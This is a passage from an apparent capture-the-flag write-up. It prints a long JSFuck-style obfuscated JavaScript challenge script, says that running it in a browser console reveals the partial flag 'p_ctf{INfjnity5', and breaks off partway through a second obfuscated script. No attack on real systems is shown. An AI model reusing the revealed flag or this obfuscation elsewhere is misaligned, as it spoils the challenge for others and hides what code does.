style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]])[<span style="color:#555">+!+</span>[]<span style="color:#555">+</span> [<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]]] <span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]<span style="color:#555">+</span> [<span style="color:#555">+!+</span>[]]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]]]](<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span> [<span style="color:#555">+!+</span>[]])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> ([<span style="color:#555">!</span>[]] <span style="color:#555">+</span> [][[]])[<span style="color:#555">+!+</span>[]<span style="color:#555">+</span> [<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]]((<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]])[([][(<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> ([][[]]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> ([<span style="color:#555">!</span>[]] <span style="color:#555">+</span> [][[]])[<span style="color:#555">+!+</span>[]<span style="color:#555">+</span> [<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]]]() <span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]])[<span style="color:#555">+!+</span>[]<span style="color:#555">+</span> [<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> ([<span style="color:#555">!</span>[]] <span style="color:#555">+</span> [][[]])[<span style="color:#555">+!+</span>[]<span style="color:#555">+</span> [<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> ([][[]]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]]](([][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]][([][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]])[<span style="color:#555">+!+</span>[]<span style="color:#555">+</span> [<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> ([][[]]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> ([][[]]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> ([][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]])[<span style="color:#555">+!+</span>[]<span style="color:#555">+</span> [<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]]]((<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> ([][[]]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> ([][[]]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [<span style="color:#555">+</span>[]])[([<span style="color:#555">!</span>[]] <span style="color:#555">+</span> [][[]])[<span style="color:#555">+!+</span>[]<span style="color:#555">+</span> [<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> ([<span style="color:#555">!</span>[]] <span style="color:#555">+</span> [][[]])[<span style="color:#555">+!+</span>[]<span style="color:#555">+</span> [<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> ([][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]]]()[<span style="color:#555">+!+</span>[]<span style="color:#555">+</span> [<span style="color:#555">+</span>[]]] <span style="color:#555">+</span>  <span style="color:#555">!</span>[] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [<span style="color:#555">+</span>[]])[([<span style="color:#555">!</span>[]] <span style="color:#555">+</span> [][[]])[<span style="color:#555">+!+</span>[]<span style="color:#555">+</span> [<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> ([<span style="color:#555">!</span>[]] <span style="color:#555">+</span> [][[]])[<span style="color:#555">+!+</span>[]<span style="color:#555">+</span> [<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> ([][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]]]()[<span style="color:#555">+!+</span>[]<span style="color:#555">+</span> [<span style="color:#555">+</span>[]]])()[([][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]])[<span style="color:#555">+!+</span>[]<span style="color:#555">+</span> [<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> ([][[]]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> ([][[]]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> ([][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]])[<span style="color:#555">+!+</span>[]<span style="color:#555">+</span> [<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]]]((<span style="color:#555">!</span>[]<span style="color:#555">+</span> [<span style="color:#555">+</span>[]])[([<span style="color:#555">!</span>[]] <span style="color:#555">+</span> [][[]])[<span style="color:#555">+!+</span>[]<span style="color:#555">+</span> [<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> ([<span style="color:#555">!</span>[]] <span style="color:#555">+</span> [][[]])[<span style="color:#555">+!+</span>[]<span style="color:#555">+</span> [<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> ([][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]]]()[<span style="color:#555">+!+</span>[]<span style="color:#555">+</span> [<span style="color:#555">+</span>[]]]) <span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]]) <span style="color:#555">+</span> ([]<span style="color:#555">+</span> [])[(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]])[<span style="color:#555">+!+</span>[]<span style="color:#555">+</span> [<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> ([][[]]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> ([][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]])[<span style="color:#555">+!+</span>[]<span style="color:#555">+</span> [<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]])[<span style="color:#555">+!+</span>[]<span style="color:#555">+</span> [<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]]]()[<span style="color:#555">+!+</span>[]<span style="color:#555">+</span> [<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]]])());
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">var</span> _0x31e3x3<span style="color:#555">=</span>([][_0xa965[<span style="color:#f60">0</span>]]()<span style="color:#555">+</span> _0xa965[<span style="color:#f60">1</span>])[<span style="color:#f60">14</span>];
</span></span><span style="display:flex;"><span>    _0x31e3x3<span style="color:#555">+=</span> (_0xa965[<span style="color:#f60">2</span>]<span style="color:#555">+</span> _0xa965[<span style="color:#f60">3</span>]<span style="color:#555">+</span>  <span style="color:#555">+</span>_0xa965[<span style="color:#f60">3</span>]<span style="color:#555">+</span> _0xa965[<span style="color:#f60">3</span>])[<span style="color:#f60">2</span>];
</span></span><span style="display:flex;"><span>    _0x31e3x3<span style="color:#555">+=</span> (<span style="color:#555">+</span>(<span style="color:#f60">35</span>))[_0xa965[<span style="color:#f60">4</span>]<span style="color:#555">+</span> <span style="color:#366">String</span>[_0xa965[<span style="color:#f60">5</span>]]](<span style="color:#f60">20</span>)[<span style="color:#f60">1</span>];
</span></span><span style="display:flex;"><span>    _0x31e3x3<span style="color:#555">+=</span> (<span style="color:#555">+</span>(<span style="color:#f60">211</span>))[_0xa965[<span style="color:#f60">4</span>]<span style="color:#555">+</span> <span style="color:#366">String</span>[_0xa965[<span style="color:#f60">5</span>]]](<span style="color:#f60">24</span>)[<span style="color:#f60">1</span>];
</span></span><span style="display:flex;"><span>    _0x31e3x3<span style="color:#555">+=</span> ( <span style="color:#069;font-weight:bold">typeof</span> <span style="color:#366">document</span>[_0xa965[<span style="color:#f60">6</span>]])[<span style="color:#f60">1</span>];
</span></span><span style="display:flex;"><span>    _0x31e3x3<span style="color:#555">+=</span> ([<span style="color:#069;font-weight:bold">false</span>]<span style="color:#555">+</span> <span style="color:#069;font-weight:bold">undefined</span>)[<span style="color:#f60">10</span>];
</span></span><span style="display:flex;"><span>    _0x31e3x3<span style="color:#555">+=</span> ([][_0xa965[<span style="color:#f60">7</span>]]<span style="color:#555">+</span> _0xa965[<span style="color:#f60">1</span>])[<span style="color:#f60">4</span>];
</span></span><span style="display:flex;"><span>    _0x31e3x3<span style="color:#555">+=</span> (<span style="color:#069;font-weight:bold">NaN</span><span style="color:#555">+</span> [<span style="color:#069;font-weight:bold">Infinity</span>])[<span style="color:#f60">10</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">var</span> _0x31e3x4<span style="color:#555">=</span>([]<span style="color:#555">==</span>  <span style="color:#555">!</span>[])<span style="color:#555">+</span> (<span style="color:#069;font-weight:bold">false</span><span style="color:#555">==</span> [])<span style="color:#555">+</span> (<span style="color:#069;font-weight:bold">false</span><span style="color:#555">==</span>  <span style="color:#555">!</span>[])<span style="color:#555">+</span> (<span style="color:#069;font-weight:bold">NaN</span><span style="color:#555">===</span> <span style="color:#069;font-weight:bold">NaN</span>)<span style="color:#555">+</span> (<span style="color:#366">document</span>[_0xa965[<span style="color:#f60">6</span>]] <span style="color:#069;font-weight:bold">instanceof</span>  <span style="color:#366">Object</span>)<span style="color:#555">+</span> (<span style="color:#366">Number</span>[_0xa965[<span style="color:#f60">8</span>]]<span style="color:#555">&gt;</span> <span style="color:#f60">0</span>);
</span></span><span style="display:flex;"><span>    _0x31e3x3<span style="color:#555">+=</span> _0x31e3x4;
</span></span><span style="display:flex;"><span>    _0x31e3x2<span style="color:#555">=</span> _0x31e3x2<span style="color:#555">+</span> _0x31e3x3};_0x31e3x1()})()
</span></span></code></pre></td></tr></table>
</div>
</div><p>Basically, we don&rsquo;t need to understand this code at all. We just need to run it in the javascript console, so that we can get the <code>_0x31e3x2</code> value. Running it in the console, we can see that the value of <code>_0x31e3x2</code> is <code>p_ctf{INfjnity5</code>.</p>
<p>Moving to the other code,</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">var</span> _0xd4d0<span style="color:#555">=</span>[<span style="color:#c30">&#34;\x62\x30\x78\x48\x63\x55\x73\x3D&#34;</span>,<span style="color:#c30">&#34;\x57\x55\x31\x74\x57\x56\x59\x3D&#34;</span>,<span style="color:#c30">&#34;\x54\x46\x68\x6C\x55\x6E\x49\x3D&#34;</span>,<span style="color:#c30">&#34;\x61\x57\x35\x77\x64\x58\x51\x3D&#34;</span>,<span style="color:#c30">&#34;\x55\x46\x6C\x35\x53\x6B\x59\x3D&#34;</span>,<span style="color:#c30">&#34;\x52\x57\x78\x32\x64\x47\x59\x3D&#34;</span>,<span style="color:#c30">&#34;\x61\x6D\x68\x35\x63\x48\x63\x3D&#34;</span>,<span style="color:#c30">&#34;\x62\x48\x4E\x49\x55\x55\x63\x3D&#34;</span>,<span style="color:#c30">&#34;\x57\x56\x5A\x52\x53\x58\x45\x3D&#34;</span>,<span style="color:#c30">&#34;\x62\x48\x68\x4B\x57\x55\x67\x3D&#34;</span>,<span style="color:#c30">&#34;\x53\x55\x39\x61\x52\x45\x49\x3D&#34;</span>,<span style="color:#c30">&#34;\x52\x6C\x6C\x35\x55\x45\x6F\x3D&#34;</span>,<span style="color:#c30">&#34;\x64\x6C\x52\x44\x65\x57\x30\x3D&#34;</span>,<span style="color:#c30">&#34;\x59\x32\x68\x68\x63\x6B\x4E\x76\x5A\x47\x56\x42\x64\x41\x3D\x3D&#34;</span>,<span style="color:#c30">&#34;\x61\x47\x56\x73\x62\x47\x38\x3D&#34;</span>,<span style="color:#c30">&#34;\x64\x48\x68\x30\x53\x57\x35\x77\x64\x58\x51\x3D&#34;</span>,<span style="color:#c30">&#34;\x4D\x7A\x5A\x6D\x4D\x57\x55\x7A\x4E\x54\x52\x68\x4F\x44\x59\x32\x4D\x6A\x63\x79\x4F\x44\x52\x69\x4E\x44\x49\x30\x4E\x6A\x55\x32\x4E\x6D\x59\x32\x59\x54\x63\x34\x4D\x6A\x4D\x3D&#34;</span>,<span 